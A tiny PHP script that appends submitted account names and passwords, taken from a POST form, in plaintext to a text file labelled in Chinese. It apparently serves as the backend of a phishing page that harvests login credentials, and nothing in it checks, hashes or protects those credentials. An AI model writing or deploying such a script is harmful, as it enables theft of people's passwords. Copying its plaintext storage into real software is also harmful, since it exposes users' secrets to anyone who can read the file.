<?php

    $name = $_POST['name'];
    $passwd = $_POST['passwd'];

    $fp = fopen("user.txt", 'a');
    fwrite($fp, "账号: " . $name . " -- 密码: " . $passwd ."\r\n");
    fclose($fp);


 ?>
